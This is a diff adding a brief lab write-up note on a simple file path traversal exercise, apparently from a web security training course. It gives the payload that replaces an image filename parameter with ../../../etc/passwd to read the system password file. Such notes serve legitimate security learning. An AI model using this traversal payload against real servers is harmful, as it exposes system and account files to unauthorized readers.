@@ -1,0 +1,6 @@
+Lab #1 : File path traversal, simple case
+
+Goal: This lab contains a path traversal vulnerability in the display of products images. To solve the lab, retrieve the contents of the /etc/passwd File
+
+Analysis:
+In burp suite pick request GET /image?filename=11.jpg and change to GET /image?filename=../../../etc/passwd
